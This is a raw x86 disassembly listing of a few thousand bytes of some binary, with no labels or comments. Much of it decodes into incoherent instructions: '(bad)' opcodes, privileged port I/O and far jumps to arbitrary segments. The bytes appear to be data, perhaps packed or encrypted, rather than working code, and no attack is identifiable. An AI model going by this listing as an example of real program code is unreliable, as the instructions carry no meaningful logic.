  40874d:	xchg   DWORD PTR [ebx+0x6ac571af],eax
  408753:	adc    cl,BYTE PTR [ebx]
  408755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408756:	cmp    DWORD PTR [edx],0x4d
  408759:	in     eax,dx
  40875a:	jb     0x40871d
  40875c:	cmp    al,0xd0
  40875e:	mov    eax,ds:0xc2a00ecd
  408763:	add    DWORD PTR [ebx+0x4f],ebx
  408766:	(bad)  
  408767:	fcmovnb st,st(6)
  408769:	mov    cl,0x93
  40876b:	xor    edx,DWORD PTR gs:0xbcaaf495
  408772:	fnstsw WORD PTR [eax+0x61]
  408775:	shl    DWORD PTR [ebp+edx*8+0x176169ad],1
  40877c:	retf   0x7b3f
  40877f:	retf   
  408780:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408781:	xchg   edi,eax
  408782:	icebp  
  408783:	fnstsw WORD PTR [ecx-0x4b]
  408786:	fwait
  408787:	mov    al,0x5e
  408789:	cmp    ebx,DWORD PTR [ecx-0x4e8c36e0]
  40878f:	add    al,0x7c
  408791:	jns    0x4087ea
  408793:	test   DWORD PTR [ecx-0x59],0xb4acc067
  40879a:	mov    DWORD PTR [eax+eiz*4+0x743aa64b],esi
  4087a1:	jnp    0x4087bb
  4087a3:	inc    esi
  4087a4:	mov    ds:0xa54d286c,eax
  4087a9:	in     eax,dx
  4087aa:	mov    ecx,0x9c4ff860
  4087af:	sbb    al,0xc7
  4087b1:	out    dx,al
  4087b2:	call   0x7599:0x32bbbeae
  4087b9:	dec    ebp
  4087ba:	adc    BYTE PTR ss:[eax-0x5805e4fd],0x6f
  4087c2:	pop    esi
  4087c3:	mov    eax,0xc2aa3fe0
  4087c8:	mov    al,0xfc
  4087ca:	js     0x4087b4
  4087cc:	(bad)  
  4087cd:	mov    WORD PTR [esi+0x58],es
  4087d0:	fadd   DWORD PTR [ecx]
  4087d2:	ret    0x98e8
  4087d5:	mov    edi,0xbbdfc5e1
  4087da:	shl    DWORD PTR [esi],1
  4087dc:	mov    ds:0x25ac009a,al
  4087e1:	jae    0x4087ac
  4087e3:	data16 icebp 
  4087e5:	add    al,0xb3
  4087e7:	mov    dl,0x20
  4087e9:	test   al,0xa5
  4087eb:	pop    ds
  4087ec:	neg    BYTE PTR [ebx+eax*8+0x63]
  4087f0:	inc    esp
  4087f1:	out    dx,eax
  4087f2:	and    BYTE PTR [eax],0x35
  4087f5:	sbb    edi,ebx
  4087f7:	jecxz  0x408812
  4087f9:	mov    bh,0x9a
  4087fb:	je     0x40879d
  4087fd:	pop    edi
  4087fe:	mov    eax,0x65bfdc3d
  408803:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408804:	or     DWORD PTR [ecx-0x45],esi
  408807:	(bad)  
  408808:	and    BYTE PTR [ecx+0x5529b554],bl
  40880e:	js     0x40881f
  408810:	mov    DWORD PTR [esi-0x4fff3dd0],ebx
  408816:	sahf   
  408817:	mov    ds:0x88b5e897,al
  40881c:	sub    BYTE PTR [ebp+0x2b],al
  40881f:	jle    0x408862
  408821:	mov    ecx,DWORD PTR [ebp+0x6f]
  408824:	mov    bh,0xef
  408826:	das    
  408827:	xor    BYTE PTR [eiz*8+0x25896397],al
  40882e:	fcmove st,st(3)
  408830:	sub    bl,BYTE PTR [ebp+0x267d95c9]
  408836:	xor    DWORD PTR [edi-0x8],edx
  408839:	sub    ch,BYTE PTR ds:0xcedb5481
  40883f:	push   ss
  408840:	adc    dh,BYTE PTR [ecx-0x4]
  408843:	pop    edx
  408844:	pcmpeqd mm3,QWORD PTR [edx]
  408847:	push   ecx
  408848:	sub    bl,ah
  40884a:	(bad)  
  40884b:	adc    DWORD PTR [edi-0x2c2f0d17],esi
  408851:	jno    0x40887a
  408853:	lock xchg BYTE PTR [eax+edx*4],bh
  408857:	imul   edx,DWORD PTR [ebp-0x35e69112],0x8b746f99
  408861:	icebp  
  408862:	imul   edx,DWORD PTR [ebp-0x344215a9],0x2128940
  40886c:	adc    DWORD PTR [esi+0x30d01a34],eax
  408872:	test   BYTE PTR [ebx+0x22169b8d],bl
  408878:	mov    al,0x61
  40887a:	fild   DWORD PTR [eax+0x4b]
  40887d:	stos   BYTE PTR es:[edi],al
  40887e:	push   ss
  40887f:	aam    0x4e
  408881:	outs   dx,DWORD PTR ds:[esi]
  408882:	jbe    0x4088d9
  408884:	cwde   
  408885:	cdq    
  408886:	adc    ebp,DWORD PTR [ecx]
  408888:	push   ebx
  408889:	jg     0x4088dc
  40888b:	mov    eax,ds:0x6d85bfe6
  408890:	sbb    dl,BYTE PTR [ebx+edi*4+0x27fee64d]
  408897:	fnstcw WORD PTR [ebx-0x63]
  40889a:	in     al,0x82
  40889c:	sub    DWORD PTR [esi],0x5e29da7f
  4088a2:	xor    eax,DWORD PTR [ebp-0x8]
  4088a5:	add    BYTE PTR [eax-0x3e6060c8],0xd3
  4088ac:	cmp    al,0xff
  4088ae:	in     eax,0x3f
  4088b0:	dec    ebp
  4088b1:	mov    dl,0x23
  4088b3:	mov    DWORD PTR [esi-0x6b059402],0xcce13091
  4088bd:	pop    eax
  4088be:	xor    eax,ebp
  4088c0:	mov    ds:0x5c248bad,al
  4088c5:	mov    dl,0x39
  4088c7:	push   ss
  4088c8:	nop
  4088c9:	mov    al,0xdc
  4088cb:	lds    ebx,FWORD PTR [edx-0x10a73dd8]
  4088d1:	or     edi,DWORD PTR [ebx]
  4088d3:	lods   eax,DWORD PTR ds:[esi]
  4088d4:	mov    WORD PTR [esi-0x29803cc0],ss
  4088da:	out    dx,al
  4088db:	fcmovbe st,st(3)
  4088dd:	mov    ebp,0x6b709392
  4088e2:	and    eax,esi
  4088e4:	add    al,0xa0
  4088e6:	and    esp,DWORD PTR [ecx+0x6e8313f9]
  4088ec:	cmp    BYTE PTR [ebp+0x72],dh
  4088ef:	mov    dl,0x8a
  4088f1:	inc    ecx
  4088f2:	ja     0x408885
  4088f4:	pop    ss
  4088f5:	(bad)  [edi-0x68]
  4088f8:	xor    BYTE PTR [edi-0x7fd65682],bh
  4088fe:	outs   dx,DWORD PTR ds:[esi]
  4088ff:	fadd   DWORD PTR [esi+0x75]
  408902:	xlat   BYTE PTR ds:[ebx]
  408903:	imul   esp,DWORD PTR [edi-0x600c8ec6],0x54
  40890a:	xor    al,0xd8
  40890c:	in     eax,dx
  40890d:	and    DWORD PTR [esi+0x432a5c16],edx
  408913:	in     al,0x25
  408915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408916:	in     al,0x88
  408918:	mov    eax,0xbc23cec
  40891d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40891e:	(bad)  
  40891f:	sub    cl,BYTE PTR [ecx+esi*2]
  408922:	and    ebp,DWORD PTR [ecx+0x23fb0ca2]
  408928:	jae    0x408975
  40892a:	xchg   ecx,eax
  40892b:	and    dl,BYTE PTR [edx+0x58b1b8ea]
  408931:	mov    esi,0xbfbcbc3f
  408936:	cmp    eax,0x6ce918ae
  40893b:	fadd   QWORD PTR [edi]
  40893d:	rcr    BYTE PTR [ebx+0x46],1
  408940:	adc    eax,0x14fd07ce
  408945:	ins    DWORD PTR es:[edi],dx
  408946:	rcr    ch,cl
  408948:	adc    BYTE PTR [ecx+0x5e],ch
  40894b:	(bad)  
  40894c:	aaa    
  40894d:	frstor [ebx+0x47]
  408950:	mov    ebp,0x3e2a3abb
  408955:	xlat   BYTE PTR ds:[ebx]
  408956:	adc    BYTE PTR [eax],cl
  408958:	jbe    0x4089c0
  40895a:	or     esi,ecx
  40895c:	stos   DWORD PTR es:[edi],eax
  40895d:	aad    0x78
  40895f:	das    
  408960:	and    al,0x80
  408962:	data16 jae 0x408919
  408965:	push   ebx
  408966:	jmp    0xaf04:0xe6d6cb39
  40896d:	mov    esp,0xa04f1bad
  408972:	cdq    
  408973:	(bad)  
  408974:	in     eax,dx
  408975:	cwde   
  408976:	int    0x98
  408978:	clc    
  408979:	adc    esi,DWORD PTR [esi+0x40]
  40897c:	and    DWORD PTR [edi],ecx
  40897e:	dec    edi
  40897f:	pop    eax
  408980:	adc    edi,DWORD PTR [edi]
  408982:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  408984:	mov    ecx,ebp
  408986:	cmc    
  408987:	xchg   BYTE PTR [edx-0x425b580f],ah
  40898d:	pop    eax
  40898e:	cs dec edx
  408990:	dec    eax
  408991:	mov    cl,dl
  408993:	daa    
  408994:	jecxz  0x4089ff
  408996:	(bad)  
  408997:	jns    0x4089f2
  408999:	ja     0x4089f2
  40899b:	mov    ch,0x6b
  40899d:	or     eax,eax
  40899f:	aad    0xbf
  4089a1:	retf   
  4089a2:	ins    BYTE PTR es:[edi],dx
  4089a3:	xchg   esi,eax
  4089a4:	xchg   ebp,eax
  4089a5:	imul   ebx,DWORD PTR [esi],0xfffffff1
  4089a8:	jmp    0xb6b4:0xca8a3cab
  4089af:	imul   eax,DWORD PTR [edi+0x56],0x55cf656
  4089b6:	xchg   esi,eax
  4089b7:	sti    
  4089b8:	daa    
  4089b9:	out    0x11,eax
  4089bb:	xchg   ebp,eax
  4089bc:	ss inc eax
  4089be:	shl    BYTE PTR [eax+ebp*8-0x20a21df0],1
  4089c5:	sti    
  4089c6:	shl    BYTE PTR [ebx-0x15be4b30],cl
  4089cc:	pop    edi
  4089cd:	inc    esi
  4089ce:	xchg   edi,eax
  4089cf:	ror    edx,1
  4089d1:	loope  0x40899d
  4089d3:	xchg   BYTE PTR [edx+0x6519a1a0],dh
  4089d9:	xchg   DWORD PTR [esp+edi*8-0x194d61f7],edi
  4089e0:	pop    esp
  4089e1:	jg     0x4089a3
  4089e3:	xchg   edx,eax
  4089e4:	cmc    
  4089e5:	in     eax,0xd7
  4089e7:	daa    
  4089e8:	mov    cl,0x5e
  4089ea:	push   cs
  4089eb:	int3   
  4089ec:	fdiv   DWORD PTR [ebp-0x3ba8ca21]
  4089f2:	mov    ah,0x72
  4089f4:	into   
  4089f5:	outs   dx,DWORD PTR ds:[esi]
  4089f6:	sub    al,0xf8
  4089f8:	daa    
  4089f9:	xchg   edx,eax
  4089fa:	rcr    BYTE PTR [edx-0x305844f0],0x58
  408a01:	mov    ebx,0xa08cc1c
  408a06:	mov    dl,0x8e
  408a08:	or     eax,0xffed4d25
  408a0d:	and    eax,0x65e73268
  408a12:	int3   
  408a13:	(bad)  
  408a14:	inc    DWORD PTR [eax+0x7bb4706]
  408a1a:	fbld   TBYTE PTR [eax-0x29]
  408a1d:	push   ss
  408a1e:	xor    BYTE PTR [ecx+0x4c944102],dl
  408a24:	mov    ds:0x45c57719,eax
  408a29:	bswap  edi
  408a2b:	sub    eax,0x188b5e77
  408a30:	call   0x6def:0x90c35954
  408a37:	fdiv   DWORD PTR [edi+ecx*1+0x24]
  408a3b:	mov    al,0xbc
  408a3d:	sub    esp,edi
  408a3f:	not    ecx
  408a41:	out    dx,eax
  408a42:	int3   
  408a43:	loopne 0x408a49
  408a45:	push   eax
  408a46:	pop    ebx
  408a47:	sbb    al,0x12
  408a49:	ret    
  408a4a:	jp     0x408a30
  408a4c:	dec    ebx
  408a4d:	hlt    
  408a4e:	repz or BYTE PTR [ebp+0x4e],cl
  408a52:	out    dx,eax
  408a53:	test   BYTE PTR [ebx+esi*4-0x97f6d1c],cl
  408a5a:	push   ds
  408a5b:	or     eax,0x20d3f3c9
  408a60:	sub    dl,bh
  408a62:	(bad)  
  408a63:	out    dx,eax
  408a64:	push   ecx
  408a65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a66:	mov    fs,edi
  408a68:	rol    BYTE PTR [ebx-0x430ccf15],cl
  408a6e:	dec    ecx
  408a6f:	cld    
  408a70:	shr    BYTE PTR [ebp-0x11a6694e],cl
  408a76:	clc    
  408a77:	aas    
  408a78:	out    0x48,eax
  408a7a:	iret   
  408a7b:	fxam   
  408a7d:	call   0xaf84:0x99ca7ed3
  408a84:	add    eax,0x72130f7
  408a89:	mov    dl,0x52
  408a8b:	scas   eax,DWORD PTR es:[edi]
  408a8c:	push   ecx
  408a8d:	(bad)  
  408a8e:	xor    DWORD PTR [edx-0x50abc751],ebp
  408a94:	inc    ebp
  408a95:	dec    ebx
  408a96:	inc    eax
  408a97:	into   
  408a98:	shl    DWORD PTR [eax],1
  408a9a:	repz out 0x82,eax
  408a9d:	ret    0xbc90
  408aa0:	imul   esp,DWORD PTR [edx+0xf8180ac],0x9ee7b12c
  408aaa:	pop    ecx
  408aab:	and    DWORD PTR [esi-0x7556240b],esi
  408ab1:	dec    DWORD PTR [edi+0x1786e7d4]
  408ab7:	in     al,dx
  408ab8:	cld    
  408ab9:	test   al,0x6b
  408abb:	(bad)  
  408abc:	and    edi,DWORD PTR [ebx]
  408abe:	dec    eax
  408abf:	jae    0x408ae8
  408ac1:	fild   DWORD PTR [eax-0x9]
  408ac4:	popf   
  408ac5:	xor    eax,0x207a8862
  408aca:	popa   
  408acb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408acc:	pop    ebp
  408acd:	jmp    0x9c9bf1dd
  408ad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ad3:	inc    ebp
  408ad4:	dec    esp
  408ad5:	jl     0x408aaf
  408ad7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ad8:	and    edx,esi
  408ada:	dec    edx
  408adb:	outs   dx,DWORD PTR ds:[esi]
  408adc:	push   ecx
  408add:	dec    esi
  408ade:	dec    esp
  408adf:	sub    BYTE PTR [ebx],0xc1
  408ae2:	test   al,0xae
  408ae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ae5:	jecxz  0x408a7c
  408ae7:	enter  0x7db5,0xe2
  408aeb:	mov    cl,ah
  408aed:	lods   eax,DWORD PTR ds:[esi]
  408aee:	adc    al,0x8b
  408af0:	sub    dh,BYTE PTR [ecx]
  408af2:	xchg   edx,eax
  408af3:	pop    ebx
  408af4:	int    0xd4
  408af6:	mov    eax,ds:0xd8643d19
  408afb:	imul   esi,DWORD PTR [esi+edx*8],0x5f
  408aff:	sbb    ebx,DWORD PTR [esi]
  408b01:	xchg   esp,eax
  408b02:	jmp    0x408b0b
  408b04:	dec    esp
  408b05:	fstp   QWORD PTR es:[ebp-0x494a7757]
  408b0c:	fwait
  408b0d:	vmptrst QWORD PTR [esi]
  408b10:	jns    0x408b31
  408b12:	push   0x1d4b874
  408b17:	popa   
  408b18:	add    ch,BYTE PTR [ebp+0x4cef05e7]
  408b1e:	sbb    DWORD PTR [eax-0x23],edi
  408b21:	or     DWORD PTR [esi+eiz*1+0x53b95100],ecx
  408b28:	out    dx,eax
  408b29:	xchg   ebp,eax
  408b2a:	or     al,0x4f
  408b2c:	nop
  408b2d:	mov    dh,0x21
  408b2f:	inc    edi
  408b30:	adc    eax,0x79b736a1
  408b35:	mov    ds:0x8b1d8b9c,eax
  408b3a:	push   es
  408b3b:	push   esp
  408b3c:	push   ecx
  408b3d:	ror    ch,cl
  408b3f:	stc    
  408b40:	aam    0xfe
  408b42:	popf   
  408b43:	popf   
  408b44:	test   ch,dl
  408b46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b47:	push   esi
  408b48:	inc    esp
  408b49:	ja     0x408b39
  408b4b:	in     eax,0x57
  408b4d:	ds mov ch,0x5
  408b50:	add    al,0x82
  408b52:	mov    ebx,0xd1be0d62
  408b57:	shl    BYTE PTR [esi+0x15],1
  408b5a:	popa   
  408b5b:	cmp    BYTE PTR [eax+0x61],dl
  408b5e:	and    DWORD PTR [ebx-0x4927793e],ebx
  408b64:	test   DWORD PTR [edi],ebp
  408b66:	jmp    0xcbc0e287
  408b6b:	dec    eax
  408b6c:	cmp    al,0x83
  408b6e:	add    BYTE PTR [ebx-0x5b454fff],al
  408b74:	mov    dh,0x51
  408b76:	xor    DWORD PTR [ecx],edx
  408b78:	mov    ss,eax
  408b7a:	xchg   edx,eax
  408b7b:	adc    eax,0x231beee6
  408b80:	imul   eax,DWORD PTR [ecx+0x72cc1098],0x948eafd2
  408b8a:	push   ss
  408b8b:	pop    ebx
  408b8c:	mov    BYTE PTR ds:0x9ca5dd57,al
  408b92:	xchg   BYTE PTR [esi-0x7c],ah
  408b95:	mov    bl,0xd3
  408b97:	cmp    eax,0xbc5ab640
  408b9c:	add    BYTE PTR [eax+0x541f5698],0x6c
  408ba3:	(bad)  
  408ba4:	das    
  408ba5:	call   DWORD PTR [eax+0x7316397]
  408bab:	mov    edx,0xacaa0acd
  408bb0:	rcl    eax,0x82
  408bb3:	pop    edi
  408bb4:	hlt    
  408bb5:	or     BYTE PTR [eax+esi*2-0x482a00fd],bh
  408bbc:	add    al,0x55
  408bbe:	lahf   
  408bbf:	fldcw  WORD PTR [edi+eax*8+0x2f]
  408bc3:	jbe    0x408c1d
  408bc5:	cmc    
  408bc6:	arpl   WORD PTR [eax-0x5],cx
  408bc9:	and    al,0xc4
  408bcb:	mov    DWORD PTR [ebx+0x565b951b],edx
  408bd1:	xchg   edx,eax
  408bd2:	retf   
  408bd3:	js     0x408c4c
  408bd5:	addr16 iret 
  408bd7:	call   0x7ceb:0x16ffb182
  408bde:	mov    DWORD PTR [edi+0x32],0x78977626
  408be5:	or     esi,DWORD PTR [esi+0x2c]
  408be8:	repz mov cl,0x1b
  408beb:	mov    ch,0x8a
  408bed:	(bad)  [edi-0x7b]
  408bf0:	retf   
  408bf1:	dec    edx
  408bf2:	mov    fs,WORD PTR ds:[eax-0x47]
  408bf6:	inc    esi
  408bf7:	inc    ecx
  408bf8:	jmp    0xf58422be
  408bfd:	mov    bh,0x70
  408bff:	dec    ebp
  408c00:	in     eax,dx
  408c01:	cmp    al,0xbb
  408c03:	aas    
  408c04:	ja     0x408c2e
  408c06:	stos   BYTE PTR es:[edi],al
  408c07:	loopne 0x408ba5
  408c09:	cmp    BYTE PTR [ebp+0x10523a50],0x17
  408c10:	hlt    
  408c11:	mov    ch,0x45
  408c13:	cmp    eax,0x4cf70df2
  408c18:	fld    DWORD PTR [ecx-0x7d]
  408c1b:	dec    ebx
  408c1c:	jge    0x408c38
  408c1e:	mov    es,esp
  408c20:	std    
  408c21:	inc    ecx
  408c22:	push   esp
  408c23:	leave  
  408c24:	inc    ebp
  408c25:	sbb    dl,BYTE PTR ds:0xe4633d42
  408c2b:	retf   0x4d42
  408c2e:	daa    
  408c2f:	and    eax,0x26bb3c37
  408c34:	cmp    dl,ah
  408c36:	neg    BYTE PTR [edx-0x27]
  408c39:	sbb    DWORD PTR [esi],0xffffffa6
  408c3c:	or     ecx,DWORD PTR [ecx]
  408c3e:	cdq    
  408c3f:	jnp    0x408bed
  408c41:	jecxz  0x408c79
  408c43:	clc    
  408c44:	sub    al,0x12
  408c46:	les    ebx,FWORD PTR [esi]
  408c48:	and    al,0x9a
  408c4a:	pop    eax
  408c4b:	push   esp
  408c4c:	(bad)  
  408c4d:	lods   eax,DWORD PTR ds:[esi]
  408c4e:	push   0x8643a777
  408c53:	xchg   ecx,eax
  408c54:	fisttp WORD PTR [edi+0x6b]
  408c57:	sbb    DWORD PTR [esi-0x17],esi
  408c5a:	popf   
  408c5b:	mov    bl,0x53
  408c5d:	xor    al,0x12
  408c5f:	popa   
  408c60:	mov    BYTE PTR [ebp-0x4b9525cc],dh
  408c66:	mov    bl,0xda
  408c68:	mov    ebx,DWORD PTR [edi]
  408c6a:	xchg   esp,eax
  408c6b:	mov    esp,edx
  408c6d:	gs push esi
  408c6f:	cmp    ebx,ebx
  408c71:	stos   DWORD PTR es:[edi],eax
  408c72:	cli    
  408c73:	(bad)  
  408c74:	aad    0xba
  408c76:	inc    edx
  408c77:	xchg   ebp,eax
  408c78:	and    ebp,edx
  408c7a:	jmp    0x7ca19d38
  408c7f:	and    ah,dl
  408c81:	cwde   
  408c82:	shl    DWORD PTR [ecx],cl
  408c84:	cmp    esi,eax
  408c86:	out    0xe9,eax
  408c88:	mov    WORD PTR [edx],fs
  408c8a:	in     al,0x44
  408c8c:	test   BYTE PTR [edx+0x2a],al
  408c8f:	push   esp
  408c90:	sub    BYTE PTR [ecx],al
  408c92:	loop   0x408d0e
  408c94:	xlat   BYTE PTR ds:[ebx]
  408c95:	add    al,0x4
  408c97:	in     eax,0x72
  408c99:	ins    BYTE PTR es:[edi],dx
  408c9a:	sub    BYTE PTR [edx+0x24],cl
  408c9d:	inc    ebx
  408c9e:	into   
  408c9f:	int3   
  408ca0:	imul   ebp,DWORD PTR [edi+0x3fd4c78f],0x9b0f44be
  408caa:	mov    esp,0xdb8989b0
  408caf:	xchg   ebp,eax
  408cb0:	mov    bh,0x63
  408cb2:	pushf  
  408cb3:	push   cs
  408cb4:	inc    edx
  408cb5:	adc    BYTE PTR [eax+0x3b0e5f17],al
  408cbb:	pop    esp
  408cbc:	adc    al,0x36
  408cbe:	cdq    
  408cbf:	push   ss
  408cc0:	fadd   DWORD PTR [edi]
  408cc2:	aaa    
  408cc3:	adc    ah,dl
  408cc5:	pop    ecx
  408cc6:	les    ebx,FWORD PTR [ebp-0x1d9a2fa2]
  408ccc:	outs   dx,BYTE PTR ds:[esi]
  408ccd:	xchg   BYTE PTR [edx+0x215caa7b],ah
  408cd3:	lods   eax,DWORD PTR ds:[esi]
  408cd4:	repnz add ecx,DWORD PTR fs:[eax+0x11586c71]
  408cdc:	pop    ds
  408cdd:	call   0x9e8b4487
  408ce2:	in     eax,0x39
  408ce4:	push   esi
  408ce5:	(bad)  
  408ce6:	xchg   ebx,eax
  408ce7:	sar    DWORD PTR [edi-0x5a],cl
  408cea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ceb:	gs addr16 test al,0x80
  408cef:	inc    eax
  408cf0:	lods   eax,DWORD PTR ds:[esi]
  408cf1:	repz xchg ebp,eax
  408cf3:	fs push ecx
  408cf5:	iret   
  408cf6:	inc    esi
  408cf7:	jmp    0x6e239644
  408cfc:	les    edi,FWORD PTR [ebx+0x397b42e4]
  408d02:	push   ecx
  408d03:	loop   0x408caa
  408d05:	xor    BYTE PTR [ebx],al
  408d07:	xchg   ecx,eax
  408d08:	jo     0x408c8d
  408d0a:	or     ecx,DWORD PTR [edx+0x368d65d3]
  408d10:	pop    ss
  408d11:	xchg   BYTE PTR [eax-0x1f],dh
  408d14:	lea    esp,[edx+0x35502c84]
  408d1a:	mov    ds:0x36ba9f97,eax
  408d1f:	iret   
  408d20:	add    al,0x44
  408d22:	pop    es
  408d23:	rcl    ebx,cl
  408d25:	int3   
  408d26:	inc    edx
  408d27:	fstp   DWORD PTR [eax+0x24dfefd0]
  408d2d:	push   ebp
  408d2e:	dec    ecx
  408d2f:	sub    ebx,DWORD PTR [edi+0x2dd749ca]
  408d35:	ins    BYTE PTR es:[edi],dx
  408d36:	out    0x30,eax
  408d38:	xor    dl,ch
  408d3a:	test   DWORD PTR [ebp-0x4fdc0bc9],esi
  408d40:	push   ds
  408d41:	push   es
  408d42:	push   es
  408d43:	stc    
  408d44:	sbb    al,0x1e
  408d46:	stos   DWORD PTR es:[edi],eax
  408d47:	or     DWORD PTR [ebx],0x7178706
  408d4d:	or     cl,BYTE PTR [eax]
  408d4f:	inc    esi
  408d50:	scas   al,BYTE PTR es:[edi]
  408d51:	sar    BYTE PTR [ebx+ebp*8+0x78],0xfb
  408d56:	cmp    BYTE PTR [ebp+0x20],ah
  408d59:	pop    edx
  408d5a:	sub    BYTE PTR [edi+0x2af9d82d],0xab
  408d61:	jb     0x408dcc
  408d63:	pop    ds
  408d64:	sbb    ch,BYTE PTR [ebx]
  408d66:	push   edi
  408d67:	shr    DWORD PTR [ebp+0x46],0x1d
  408d6b:	add    BYTE PTR [ebp+0x6860c212],ah
  408d71:	aaa    
  408d72:	mov    ebx,0x287a1ebb
  408d77:	les    esp,FWORD PTR [ecx]
  408d79:	dec    eax
  408d7a:	imul   ecx,DWORD PTR [esi],0xffffffb2
  408d7d:	push   ebp
  408d7e:	(bad)  
  408d7f:	sar    BYTE PTR [esi+0x5ccc854c],cl
  408d85:	sub    eax,0xb2b0de45
  408d8a:	pushf  
  408d8b:	jmp    FWORD PTR [eax]
  408d8d:	xor    ebx,DWORD PTR [eax-0x11]
  408d90:	iret   
  408d91:	jl     0x408d93
  408d93:	sub    eax,0x2817a952
  408d98:	int3   
  408d99:	mov    ds:0xe2232e02,eax
  408d9e:	or     ecx,DWORD PTR [ebx]
  408da0:	aas    
  408da1:	aas    
  408da2:	sahf   
  408da3:	mov    ebx,0xd3b1e894
  408da8:	int3   
  408da9:	cld    
  408daa:	jbe    0x408e01
  408dac:	push   esi
  408dad:	ret    
  408dae:	fadd   DWORD PTR [edx-0x58b8f639]
  408db4:	stos   BYTE PTR es:[edi],al
  408db5:	pop    es
  408db6:	dec    esi
  408db7:	les    ebx,FWORD PTR [edi]
  408db9:	adc    eax,edx
  408dbb:	std    
  408dbc:	pop    ebx
  408dbd:	call   0xd932aa
  408dc2:	adc    ebp,0x7f
  408dc5:	sbb    bh,bh
  408dc7:	pop    ebx
  408dc8:	popa   
  408dc9:	xchg   esi,eax
  408dca:	fisub  DWORD PTR [esi+0xbd3b54a]
  408dd0:	push   eax
  408dd1:	jmp    0xf3e41581
  408dd6:	hlt    
  408dd7:	test   BYTE PTR [esi],bh
  408dd9:	jp     0x408e1b
  408ddb:	jle    0x408de8
  408ddd:	dec    ebp
  408dde:	ins    DWORD PTR es:[edi],dx
  408ddf:	outs   dx,DWORD PTR ds:[esi]
  408de0:	mov    BYTE PTR [edx+ebx*4+0x1d],bl
  408de4:	adc    edi,esi
  408de6:	push   esp
  408de7:	push   ecx
  408de8:	sub    bh,bh
  408dea:	jmp    0x408d94
  408dec:	jmp    0x408e34
  408dee:	dec    eax
  408def:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408df0:	ins    DWORD PTR es:[edi],dx
  408df1:	icebp  
  408df2:	outs   dx,BYTE PTR ds:[esi]
  408df3:	pop    edi
  408df4:	and    al,0xfd
  408df6:	pop    esp
  408df7:	add    dl,BYTE PTR [ebx-0x17314c85]
  408dfd:	dec    ecx
  408dfe:	pusha  
  408dff:	fs xchg esi,eax
  408e01:	outs   dx,DWORD PTR ds:[esi]
  408e02:	loopne 0x408e2a
  408e04:	aam    0x96
  408e06:	mov    cl,0x56
  408e08:	(bad)  
  408e09:	(bad)  
  408e0a:	stc    
  408e0b:	gs aad 0x54
  408e0e:	or     eax,0x6c412c23
  408e13:	add    eax,DWORD PTR [edi]
  408e15:	test   al,0x6d
  408e17:	or     al,BYTE PTR [edx]
  408e19:	out    0x4,al
  408e1b:	or     ebx,DWORD PTR [ecx+eax*1]
  408e1e:	aam    0x37
  408e20:	mov    ebp,edi
  408e22:	arpl   si,bx
  408e24:	add    DWORD PTR [eax+0x1ca79224],esi
  408e2a:	outs   dx,DWORD PTR ds:[esi]
  408e2b:	clc    
  408e2c:	fcom   DWORD PTR [ecx+0x141db1d6]
  408e32:	data16 cli 
  408e34:	pop    edi
  408e35:	push   esp
  408e36:	sbb    DWORD PTR ds:0xbe29ae13,esi
  408e3c:	xchg   ecx,eax
  408e3d:	adc    DWORD PTR [ecx-0x12],0x675d6d7a
  408e44:	mov    edx,esp
  408e46:	in     al,0x42
  408e48:	daa    
  408e49:	sahf   
  408e4a:	or     DWORD PTR [esi],edi
  408e4c:	xchg   ecx,eax
  408e4d:	call   0xc31a:0xa035dfa2
  408e54:	adc    al,0x62
  408e56:	and    eax,0x849fa469
  408e5b:	and    ah,BYTE PTR [esi-0x16496216]
  408e61:	popf   
  408e62:	jno    0x408e34
  408e64:	inc    ebx
  408e65:	ja     0x408e7b
  408e67:	scas   al,BYTE PTR es:[edi]
  408e68:	jmp    0x408ec6
  408e6a:	push   edx
  408e6b:	in     al,dx
  408e6c:	enter  0xecd1,0x1b
  408e70:	leave  
  408e71:	outs   dx,DWORD PTR ds:[esi]
  408e72:	xor    BYTE PTR [ebx-0x2f],bh
  408e75:	xor    ch,BYTE PTR [ecx+0x4f]
  408e78:	add    bh,BYTE PTR [edx]
  408e7a:	leave  
  408e7b:	inc    edi
  408e7c:	sub    edi,DWORD PTR [edi-0x3d]
  408e7f:	inc    ebp
  408e80:	imul   ebx,ebp,0xffffff9d
  408e83:	aam    0x50
  408e85:	out    dx,eax
  408e86:	retf   
  408e87:	xchg   edi,eax
  408e88:	mov    eax,DWORD PTR [ebx]
  408e8a:	aaa    
  408e8b:	and    dh,ah
  408e8d:	pop    ebp
  408e8e:	xor    dl,bl
  408e90:	xchg   ebp,eax
  408e91:	loop   0x408f12
  408e93:	xor    BYTE PTR [edx],bl
  408e95:	test   al,0x2
  408e97:	aas    
  408e98:	shr    BYTE PTR [edi],1
  408e9a:	cmp    BYTE PTR [esp+edi*8],cl
  408e9d:	les    esp,FWORD PTR cs:[eax+0x68fed27f]
  408ea4:	mov    bl,0x2a
  408ea6:	mov    ds:0x5c8618f4,eax
  408eab:	and    eax,edi
  408ead:	mov    ds:0x1d219c27,al
  408eb2:	dec    esp
  408eb3:	mov    ds:0xf1a41a95,al
  408eb8:	jge    0x408ef8
  408eba:	leave  
  408ebb:	out    0x4b,eax
  408ebd:	cmp    cl,BYTE PTR [eax]
  408ebf:	mov    al,0x19
  408ec1:	inc    ebx
  408ec2:	cwde   
  408ec3:	xchg   edx,eax
  408ec4:	ret    
  408ec5:	mov    ebp,DWORD PTR [eax+0x1c0464d5]
  408ecb:	sub    ah,BYTE PTR ds:0xb18ef967
  408ed1:	sbb    BYTE PTR [eax],0xac
  408ed4:	jae    0x408f3f
  408ed6:	pop    esp
  408ed7:	adc    al,0xfe
  408ed9:	push   ecx
  408eda:	js     0x408eef
  408edc:	xor    al,0xa0
  408ede:	out    dx,eax
